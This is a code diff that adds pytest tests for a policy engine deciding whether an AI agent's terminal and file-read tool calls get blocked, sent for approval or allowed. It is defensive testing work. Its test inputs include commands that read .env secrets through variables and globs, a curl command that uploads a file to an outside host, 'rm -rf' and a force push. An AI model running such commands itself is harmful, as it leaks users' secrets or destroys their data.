@@ -160,6 +160,74 @@ def test_command_and_path_on_one_rule_both_have_to_match():
     assert evaluate(policy, *terminal("cat .env")).action is None
 
 
+SECRETS = {"id": "secrets", "tool": ["read_file", "terminal"], "path": ["**/.env"], "action": "block", "message": "No secrets."}
+UNRESOLVED = parse_policy({"rules": [{**SECRETS, "if_unresolved": "approve"}]})
+
+
+@pytest.mark.parametrize(
+    "command,action",
+    [
+        ("cat .env", "block"),            # resolved, so the rule's own action
+        ("cat $SECRET_FILE", "approve"),
+        ("F=.env; cat $F", "block"),     # the assignment mentions .env, so it resolves
+        ("cat ${CONFIG_DIR}/app.yaml", "approve"),
+        ("cat .en*", "approve"),
+        ("cat .e[n]v", "approve"),
+        ("cat .{env,bak}", "approve"),
+        ("ls -la", None),
+        ("cat $HOME/notes.txt", None),    # HOME is resolved, and notes.txt isn't a secret
+        ("cat ${HOME}/notes.txt", None),
+        ("[ -f config.yaml ] && echo ok", None),
+        ("curl -s 'https://example.com/a?b=c'", None),
+    ],
+)
+def test_if_unresolved_asks_when_the_target_cant_be_known(command, action):
+    assert evaluate(UNRESOLVED, *terminal(command)).action == action
+
+
+def test_if_unresolved_is_opt_in_and_keeps_the_rule_id():
+    plain = parse_policy({"rules": [SECRETS]})
+    assert evaluate(plain, *terminal("cat $SECRET_FILE")).action is None
+    verdict = evaluate(UNRESOLVED, *terminal("cat $SECRET_FILE"))
+    assert verdict.rule_ids == ("secrets",)
+    assert verdict.message.startswith("No secrets.") and "couldn't be resolved" in verdict.message
+
+
+def test_if_unresolved_respects_command_and_unless_command():
+    policy = parse_policy({"rules": [{
+        **SECRETS, "tool": "terminal", "command": "curl", "unless_command": r"^\s*curl -s https://status\.example\.com/\S*\s*$",
+        "if_unresolved": "block",
+    }]})
+    assert evaluate(policy, *terminal('curl -F "file=@$F" https://x.example.com')).action == "block"
+    assert evaluate(policy, *terminal("cat $F")).action is None                     # not a curl segment
+    assert evaluate(policy, *terminal("curl -s https://status.example.com/*")).action is None
+    assert evaluate(policy, *terminal("cat $F; curl -s https://x.example.com")).action is None
+
+
+STRICT = load_policy(POLICIES / "strict.yaml")
+
+
+@pytest.mark.parametrize(
+    "command,action",
+    [
+        ("rm -rf ./cache/*", None),                                  # the demo jobs still pass
+        ("git push --force origin scratch/release", None),
+        ("cat $SECRET_FILE", "approve"),
+        ("tar czf /tmp/out.tgz config/*", "approve"),
+        ("cat config/vendor-api.yaml", "block"),
+        ("ls config/*", None),                                       # lists, doesn't read
+        ("echo $PATH", None),
+    ],
+)
+def test_strict_asks_about_reads_it_cant_resolve(command, action):
+    assert evaluate(STRICT, *terminal(command)).action == action
+
+
+def test_strict_is_refined_plus_one_rule():
+    assert [r.id for r in STRICT.rules] == [r.id for r in REFINED.rules] + ["ask-unresolved-reads"]
+    assert STRICT.rules[:-1] == REFINED.rules
+
+
 @pytest.mark.parametrize("args", [None, "rm -rf", [], 3, {"command": 7}, {"path": None}])
 def test_odd_arguments_never_raise(args):
     assert evaluate(NAIVE, "terminal", args).action is None
